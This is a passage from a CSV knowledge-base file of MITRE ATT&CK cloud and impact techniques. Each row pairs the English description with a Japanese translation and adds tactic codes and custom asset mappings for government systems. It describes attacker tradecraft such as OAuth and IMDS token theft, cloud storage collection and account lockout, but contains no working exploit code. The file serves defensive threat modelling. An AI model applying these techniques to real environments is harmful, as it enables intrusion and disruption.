2019年9月）,persistence,IaaS;Containers,script_command_execution,foothold,endpoint_execution;cloud_control_plane,specified,Unknown,has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--4fd8a28b-4b3a-4cd6-a8cf-85ba5f824a7f,2019-09-04T12:04:03.552Z,2025-04-25T15:15:30.983Z,,,,
T1526,,Cloud Service Discovery,クラウドサービス検出,"An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs. Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API) For example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu) Adversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) or [Disable or Modify Cloud Logs](https://attack.mitre.org/techniques/T1562/008).",攻撃者はアクセス権を取得後、システム上で稼働中のクラウドサービスを列挙しようとする可能性がある。これらの手法は、プラットフォーム・アズ・ア・サービス（PaaS）、インフラストラクチャ・アズ・ア・サービス（IaaS）、ソフトウェア・アズ・ア・サービス（SaaS）によって異なる。様々なクラウドプロバイダーには、継続的インテグレーションと継続的デリバリー（CI/CD）、Lambda関数、Entra IDなど、多数のサービスが存在する。 また、AWS GuardDutyやMicrosoft Defender for Cloudなどのセキュリティサービス、AWS CloudTrailやGoogle Cloud Audit Logsなどのロギングサービスも含まれる。攻撃者は環境全体で有効化されたサービスに関する情報を発見しようとする可能性がある。Microsoft Graph APIやAzure Resource Manager APIなどのAzureツールとAPIは、アプリケーション、管理グループ、リソース、ポリシー定義、および識別情報によってアクセス可能なそれらの関係性を含むリソースとサービスを列挙できる。(引用元: Azure - Resource Manager API)(引用元: Azure AD Graph API) 例えば、StormspotterはAzureリソースとサービスの列挙およびグラフ構築のためのオープンソースツールであり、Pacuはクラウドサービスの発見を複数手法でサポートするオープンソースのAWSエクスプロイトフレームワークである。(引用元: Azure - Stormspotter)(引用元: GitHub Pacu) 攻撃者は得られた情報を基に、列挙されたサービスからのデータや認証情報の標的化、あるいは[ツールの無効化または変更](https://attack.mitre.org/techniques/T1562/001)や [クラウドログの無効化または改変](https://attack.mitre.org/techniques/T1562/008)によって特定された防御策を回避するといった行動を決定する可能性があります。,discovery,SaaS;IaaS;Office Suite;Identity Provider,credential_abuse,situational_awareness,authentication_system;cloud_control_plane;saas_in_use;logging_monitoring,specified,Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud,has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--e24fcba8-2557-4442-a139-1ee2f2e784db,2019-08-30T13:01:10.120Z,2025-04-15T22:03:24.903Z,,,,
T1527,,Application Access Token,アプリケーションアクセストークン,"Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials. Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta) For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a ""refresh"" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017) Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",攻撃者はアプリケーションアクセストークンを利用し、通常の認証プロセスを迂回してリモートシステム上の制限付きアカウント、情報、サービスにアクセスする可能性があります。これらのトークンは通常、ユーザーから窃取され、ログイン認証情報の代わりに使用されます。アプリケーションアクセストークンはユーザーに代わって承認済みAPIリクエストを実行するために使用され、クラウドベースアプリケーションやSaaS（Software-as-a-Service）のリソースへのアクセス手段として広く利用されています。(引用元: Auth0 - Why You Should Always Use Access Tokens to Secure APIs 2019年9月) OAuthは、システムへのアクセス権限をユーザーに付与するトークンを発行する、一般的に実装されているフレームワークの一つです。これらのフレームワークは連携してユーザーを検証し、ユーザーが実行を許可されているアクションを決定します。身元が確認されると、トークンにより、ユーザーの実際の認証情報を渡すことなくアクションの承認が可能になります。 したがって、トークンが侵害されると、悪意のあるアプリケーションを通じて攻撃者が他のサイトのリソースにアクセスできる可能性があります。(引用元: okta) 例えば、クラウドベースのメールサービスでは、悪意のあるアプリケーションにOAuthアクセストークンが付与されると、バックグラウンドアクセスを可能にする「リフレッシュ」トークンが付与された場合、ユーザーアカウントの機能への長期的なアクセス権を取得する可能性があります。（引用元：Microsoft Identity Platform Access 2019）OAuthアクセストークンを悪用すれば、攻撃者はユーザーが許可したREST APIを利用してメール検索や連絡先列挙などの機能を実行できる（引用元：Staaldraad Phishing with OAuth 2017）。侵害されたアクセストークンは、他のサービスを侵害する第一段階として利用される可能性がある。 例えば、トークンが被害者の主要メールへのアクセスを許可する場合、攻撃者はパスワード再設定ルーチンをトリガーすることで、対象が利用する他の全サービスへのアクセスを拡張できる可能性がある。トークンを介した直接的なAPIアクセスは、第二認証要素の効果を無効化し、パスワード変更のような直感的な対策にも耐性を持つ。APIチャネルを介したアクセス悪用は、正当なワークフローと整合するため、サービスプロバイダー側でも検知が困難な場合がある。,defense-evasion;lateral-movement,SaaS;Office 365,credential_abuse,boundary_crossing,authentication_system;identity_federation;user_interaction;endpoint_execution;network_connectivity;email_infrastructure;cloud_control_plane;saas_in_use;logging_monitoring,specified,Identity / SaaS (IdP/SSO);Log / Monitoring Server;Mail / Collaboration;Management Console for GovCloud,revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0008,attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a,2019-08-30T12:55:58.607Z,2025-04-15T19:58:15.327Z,,,,
T1528,,Steal Application Access Token,アプリケーションアクセストークンの窃取,"Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources. Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment. For example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the container’s token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes Service Accounts) Similarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment.(Citation: Cider Security Top 10 CICD Security Risks) If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges. In Azure, an adversary who compromises a resource with an attached Managed Identity, such as an Azure VM, can request short-lived tokens through the Azure Instance Metadata Service (IMDS). These tokens can then facilitate unauthorized actions or further access to other Azure services, bypassing typical credential-based authentication.(Citation: Entra Managed Identities 2025)(Citation: SpecterOps Managed Identity 2022) Token theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017) The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019) Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens(Citation: Auth0 Understanding Refresh Tokens), allowing them to obtain new access tokens without prompting the user.",攻撃者は、リモートシステムやリソースへのアクセス資格情報を取得する手段としてアプリケーションアクセストークンを窃取する。アプリケーションアクセストークンは、ユーザーやサービスに代わって認証済みAPIリクエストを実行するために使用され、クラウドやコンテナベースのアプリケーション、SaaS（Software-as-a-Service）におけるリソースアクセス手段として広く利用されている。(引用元: Auth0 - Why You Should Always Use Access Tokens to Secure APIs 2019年9月)クラウド環境やコンテナ環境でアカウントAPIトークンを窃取した攻撃者は、当該アカウントの権限でデータにアクセスしたり操作を実行したりできる可能性があり、特権昇格や環境のさらなる侵害につながる恐れがある。例えばKubernetes環境では、コンテナ内で実行中のプロセスがサービスアカウントトークンを使用してKubernetes APIサーバーと通信する場合がある。 コンテナが侵害された場合、攻撃者はコンテナのトークンを窃取し、Kubernetes APIコマンドへのアクセス権を取得できる可能性があります。(引用元: Kubernetes Service Accounts) 同様に、継続的開発/継続的インテグレーション(CI/CD)パイプライン内のインスタンスは、テストやデプロイのために他のサービスへの認証にAPIトークンを使用することがよくあります。(引用元: Cider Security Top 10 CICD Security Risks) これらのパイプラインが侵害された場合、攻撃者はトークンを窃取し、その特権を悪用できる可能性があります。Azureでは、Azure VMなどマネージドIDが紐付けられたリソースを侵害した攻撃者は、Azureインスタンスメタデータサービス（IMDS）を通じて短命トークンを要求できます。 これらのトークンは、通常の認証情報ベースの認証を迂回して、不正な操作や他の Azure サービスへのさらなるアクセスを可能にします。(引用元: Entra Managed Identities 2025)(引用元: SpecterOps Managed Identity 2022) トークンの窃取はソーシャルエンジニアリングによっても発生し、その場合はアクセス許可を得るためにユーザーの操作が必要となる場合があります。 OAuthは、システムへのアクセス権をユーザーに付与するトークンを発行する、一般的に実装されているフレームワークの一つです。クラウドベースのサービスや保護されたAPIへのアクセスを望むアプリケーションは、OAuth 2.0を介して様々な認可プロトコルを使用してアクセス権を取得できます。一般的に使用されるシーケンスの一例は、Microsoftの認可コードグラントフローです。(引用元: Microsoft Identity Platform Protocols 2019年5月)(引用元: Microsoft - OAuth Code Authorization flow - 2019年6月) OAuthアクセストークンにより、サードパーティアプリケーションはユーザー認証情報を取得することなく、アプリケーションが要求する方法でユーザーデータを含むリソースとやり取りできます。攻撃者は、標的ユーザーのOAuthトークンでリソースへのアクセスを許可されるように設計された悪意のあるアプリケーションを構築することで、OAuth認証を悪用できます。(引用: Amnesty OAuthフィッシング攻撃、2019年8月)(引用: Trend Micro Pawn Storm OAuth 2017) 攻撃者は、Azure Portal、Visual Studio IDE、コマンドラインインターフェース、PowerShell、またはREST API呼び出しなどを使用して、Microsoft Identity Platformなどの認証サーバーにアプリケーションの登録を完了させる必要があります。(引用: Microsoft - Azure AD アプリ登録 - 2019年5月) その後、標的となるユーザーに [スピアフィッシングリンク](https://attack.mitre.org/techniques/T1566/002) を送信し、アプリケーションへのアクセス許可を誘導します。 OAuthアクセストークンが付与されると、アプリケーションは[アプリケーションアクセストークン](https://attack.mitre.org/techniques/T1550/001)を通じてユーザーアカウントの機能に長期的にアクセスできる可能性があります。(引用元: Microsoft - Azure AD Identity Tokens - Aug 2019) アプリケーションアクセストークンは有効期限が設定されている場合があり、攻撃者が盗んだトークンを利用できる期間を制限します。しかし、攻撃者がアプリケーションリフレッシュトークンも盗むケースがあり(引用元: Auth0 Understanding Refresh Tokens)、ユーザーに確認を促すことなく新しいアクセストークンを取得することが可能になります。,credential-access,SaaS;Containers;IaaS;Office Suite;Identity Provider,credential_abuse,credential_gain,authentication_system;identity_federation;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;saas_in_use,specified,Identity / SaaS (IdP/SSO);Management Console for GovCloud,has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--890c9858-598c-401d-a4d5-c67ebcdd703a,2019-09-04T15:54:25.684Z,2025-04-15T19:58:49.300Z,,,,
T1529,,System Shutdown/Reboot,システムのシャットダウン/再起動,"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A) They may also include shutdown/reboot of a virtual machine via hypervisor / cloud consoles or command line tools. Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery. Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)",攻撃者は、システムへのアクセスを妨害したり、システムの破壊を助長したりするために、システムをシャットダウン/再起動させることがあります。オペレーティングシステムには、マシンやネットワークデバイスのシャットダウン/再起動を開始するコマンドが含まれている場合があります。 場合によっては、これらのコマンドは[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)を介してリモートコンピュータやネットワークデバイスのシャットダウン/再起動を開始するためにも使用される可能性があります（例：<code>reload</code>）。(引用元: Microsoft Shutdown Oct 2017)(引用元: alert_TA18_106A) ハイパーバイザー/クラウドコンソールやコマンドラインツールを介した仮想マシンのシャットダウン/再起動も含まれる場合があります。システムのシャットダウンや再起動は、正当なユーザーのコンピュータリソースへのアクセスを妨げるだけでなく、インシデント対応/復旧を阻害する可能性があります。 攻撃者は、[ディスク構造の消去](https://attack.mitre.org/techniques/T1561/002) や [システム復旧の妨害](https://attack.mitre.org/techniques/T1490) など、他の方法でシステムに影響を与えた後、システムの可用性に対する意図した効果を早めるために、システムのシャットダウン/再起動を試みる場合があります。(引用: Talos Nyetya 2017年6月)(引用: Talos Olympic Destroyer 2018),impact,Linux;macOS;Windows;Network Devices;ESXi,script_command_execution,impact,user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;logging_monitoring,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc,2019-10-04T20:42:28.541Z,2025-04-15T19:59:24.950Z,,,,
T1530,,Data from Cloud Storage,クラウドストレージからのデータ,"Adversaries may access data from cloud storage. Many IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. In some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). Adversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions. This open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021) Adversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.","攻撃者はクラウドストレージからデータにアクセスする可能性があります。 多くのIaaSプロバイダーは、Amazon S3、Azure Storage、Google Cloud Storageなどのオンラインデータオブジェクトストレージソリューションを提供しています。同様に、Office 365やGoogle WorkspaceなどのSaaSエンタープライズプラットフォームは、OneDriveやGoogle Driveなどのサービスを通じてユーザーにクラウドベースのドキュメントストレージを提供しています。一方、Slack、Confluence、Salesforce、DropboxなどのSaaSアプリケーションプロバイダーは、プラットフォームの周辺機能または主要なユースケースとしてクラウドストレージソリューションを提供する場合があります。 IaaSベースのクラウドストレージのように、保存されたオブジェクトとやり取りするための包括的なアプリケーション（SQLやElasticsearchなど）が存在しない場合もあります。代わりに、これらのソリューションからのデータは[Cloud API](https://attack.mitre.org/techniques/T1059/009)を通じて直接取得されます。 SaaSアプリケーションでは、攻撃者はフロントエンドアプリケーションやインターフェース（例：[情報リポジトリからのデータ](https://attack.mitre.org/techniques/T1213)）を経由せず、APIやバックエンドのクラウドストレージオブジェクトから直接データを収集できる可能性があります。 攻撃者はこれらのクラウドストレージソリューションから機密データを収集する可能性があります。プロバイダーは通常、エンドユーザーがシステムを設定するためのセキュリティガイドを提供していますが、設定ミスは一般的な問題です。（引用元：Amazon S3 Security, 2019）（引用元：Microsoft Azure Storage Security, 2019）（引用元：Google Cloud Storage Best Practices, 2019） クラウドストレージが不適切に保護された事例は数多く発生しており、典型的には認証されていないユーザーへの意図しない公開アクセス、全ユーザーに対する過度に広範なアクセス権限、あるいはIDアクセス管理システムの制御外で基本的なユーザー権限すら必要としない匿名者へのアクセスが許可されるケースが挙げられる。 この無制限アクセスにより、クレジットカード情報、個人識別情報（PII）、医療記録など様々な機密データが晒される危険性があります。(引用: Trend Micro S3 Exposed PII, 2017)(引用: Wired Magecart S3 Buckets, 2019)(引用: HIPAA Journal S3 Breach, 2017)(引用: Rclone-mega-extortion_05_2021) 敵対者は、クラウドストレージオブジェクトへのアクセス手段として、ソースリポジトリ、ログ、その他の手段から漏洩した認証情報を入手し、悪用する可能性もあります。",collection,IaaS;SaaS;Office Suite,credential_abuse,asset_access,authentication_system;user_interaction;email_infrastructure;cloud_control_plane;saas_in_use;file_storage_access;database_access;logging_monitoring,specified,Identity / SaaS (IdP/SSO);Log / Monitoring Server;Mail / Collaboration;Management Console for GovCloud,has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7,2019-08-30T18:07:27.741Z,2025-04-15T22:15:26.889Z,,,,
T1531,,Account Access Removal,アカウントアクセス削除,"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019) In Windows, [Net](https://attack.mitre.org/software/S0039) utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets may be used by adversaries to modify user accounts. Accounts could also be disabled by Group Policy. In Linux, the <code>passwd</code> utility may be used to change passwords. On ESXi servers, accounts can be removed or modified via esxcli (`system account set`, `system account remove`). Adversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Defacement](https://attack.mitre.org/techniques/T1491), in order to impede incident response/recovery before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) objective.",攻撃者は、正当なユーザーが使用するアカウントへのアクセスを妨害することで、システムおよびネットワークリソースの利用可能性を中断させる可能性があります。アカウントは削除、ロック、または操作（例：認証情報の変更）されることでアクセスが削除されます。攻撃者はその後、ログオフおよび/または[システムシャットダウン/再起動](https://attack.mitre.org/techniques/T1529)を実行して悪意のある変更を確定させることもあります。(引用: CarbonBlack LockerGoga 2019)(引用: Unit42 LockerGoga 2019)Windowsでは、[Net](https://attack.mitre.org/software/S0039)ユーティリティ、<code>Set-LocalUser</code>および<code>Set-ADAccountPassword</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) コマンドレットがユーザーアカウント変更に悪用される可能性があります。グループポリシーによるアカウント無効化も想定されます。 Linuxでは、<code>passwd</code>ユーティリティを使用してパスワードを変更できます。ESXiサーバーでは、esxcli（`system account set`、`system account remove`）経由でアカウントを削除または変更可能です。ランサムウェアや類似攻撃を利用する攻撃者は、まずこの操作やその他の影響行為（[データ破壊](https://attack.mitre.org/techniques/T1485)や [改ざん](https://attack.mitre.org/techniques/T1491)などの影響行動を実行し、インシデント対応/復旧を妨害した後に、[影響目的のデータ暗号化](https://attack.mitre.org/techniques/T1486)を完了させる可能性があります。,impact,Linux;macOS;Windows;SaaS;IaaS;Office Suite;ESXi,credential_abuse,impact,authentication_system;user_interaction;endpoint_execution;endpoint_management;network_connectivity;cloud_control_plane;logging_monitoring,specified,Business Workstation;File Server;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud;My Number Administrative System on GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--b24e2a20-3b3d-4bf0-823b-1ed765398fb0,2019-10-09T18:48:31.906Z,2025-04-15T19:58:58.987Z,,,,
T1534,,Internal Spearphishing,内部スピアフィッシング,"After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating [Impersonation](https://attack.mitre.org/techniques/T1656).(Citation: Trend Micro - Int SP) For example, adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic login interfaces. Adversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.(Citation: Int SP - chat apps)",環境内のアカウントやシステムへのアクセス権を取得した後、攻撃者は内部スピアフィッシングを利用して追加情報の取得や同一組織内の他のユーザーの侵害を試みる場合があります。内部スピアフィッシングは多段階のキャンペーンであり、最初に正当なアカウントを侵害します。これはユーザーのデバイスを制御するか、ユーザーのアカウント認証情報を侵害することで達成されます。 攻撃者はその後、信頼された内部アカウントを悪用し、より多くの被害者をフィッシング攻撃に騙し込む可能性を高めようと試みます。この際、[なりすまし](https://attack.mitre.org/techniques/T1656)を組み込むことがよくあります。(引用元: Trend Micro - Int SP) 例えば、攻撃者は内部スピアフィッシングの一環として、[スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001) や [スピアフィッシングリンク](https://attack.mitre.org/techniques/T1566/002)を内部向けスピアフィッシングの一環として使用し、ペイロードを配信したり、外部サイトへリダイレクトして、ログインインターフェースを模倣したサイト上で[入力キャプチャ](https://attack.mitre.org/techniques/T1056)により認証情報を取得しようとする。 攻撃者はまた、Microsoft Teamsなどの社内チャットアプリを悪用し、悪意のあるコンテンツを拡散したり、ユーザーを誘導して機密情報や認証情報を取得しようとする試みを行う可能性がある。(引用元: Int SP - chat apps),lateral-movement,Windows;macOS;Linux;SaaS;Office Suite,credential_abuse,boundary_crossing,authentication_system;user_interaction;logging_monitoring,specified,Business Workstation;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--9e7452df-5144-4b6e-b04a-b66dd4016747,2019-09-04T19:26:12.441Z,2025-04-15T22:42:40.610Z,,,,
T1535,,Unused/Unsupported Cloud Regions,未使用/非サポートのクラウドリージョン,"Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure. Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected. A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity. An example of adversary use of unused AWS regions is to mine cryptocurrency through [Resource Hijacking](https://attack.mitre.org/techniques/T1496), which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)",攻撃者は、検知回避のために未使用の地理的サービス地域にクラウドインスタンスを作成することがあります。 アクセスは通常、クラウドインフラ管理用アカウントの侵害を通じて取得される。クラウドサービスプロバイダーは、パフォーマンス向上、冗長性確保、顧客のコンプライアンス要件対応を目的に、世界中にインフラを提供している。顧客は利用可能なリージョンのサブセットのみを使用し、他のリージョンを積極的に監視しない場合が多い。攻撃者が未使用リージョンにリソースを作成すれば、検知されずに活動できる可能性がある。この手法の変種として、クラウドリージョン間の機能差を悪用するケースがある。 攻撃者は、高度な検知サービスをサポートしていないリージョンを利用することで、自身の活動の検知を回避できます。攻撃者が未使用のAWSリージョンを利用する例として、[リソースハイジャック](https://attack.mitre.org/techniques/T1496)による暗号通貨のマイニングが挙げられます。これは使用される処理能力に応じて、組織に長期的に多額の費用を負担させる可能性があります。（引用元: CloudSploit - Unused AWS Regions）,defense-evasion,IaaS,other,stealth,endpoint_execution;cloud_control_plane;logging_monitoring,specified,Unknown,has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--59bd0dec-f8b2-4b9a-9141-37a1e6899761,2019-09-04T14:35:04.617Z,2025-04-15T23:17:42.649Z,,,,
T1536,,Revert Cloud Instance,クラウドインスタンスの復元,"An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs. Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",攻撃者は、悪意のある活動実行後にクラウドインスタンスへの変更を元に戻し、検知回避と痕跡消去を図る可能性がある。クラウド基盤のような高度に仮想化された環境では、クラウド管理ダッシュボードやAPIを介した仮想マシン（VM）やデータストレージのスナップショット復元で実現される。この手法の別形態として、コンピューティングインスタンスに接続された一時ストレージの活用がある。 ほとんどのクラウドプロバイダーは、永続的、ローカル、一時的など様々なタイプのストレージを提供しており、一時的なタイプはVMの停止/再起動時にリセットされることが多い。(引用元: Tech Republic - Restore AWS Snapshots)(引用元: Google - Restore Cloud Snapshot),defense-evasion,IaaS,other,stealth,cloud_control_plane;file_storage_access,specified,Backup Server,revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--3b4121aa-fc8b-40c8-ac4f-afcb5838b72c,2019-09-04T14:37:07.959Z,2025-04-25T15:15:25.095Z,,,,
T1537,,Transfer Data to Cloud Account,クラウドアカウントへのデータ転送,"Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service. A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.(Citation: TLDRSec AWS Attacks) Adversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.(Citation: Microsoft Azure Storage Shared Access Signature) Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 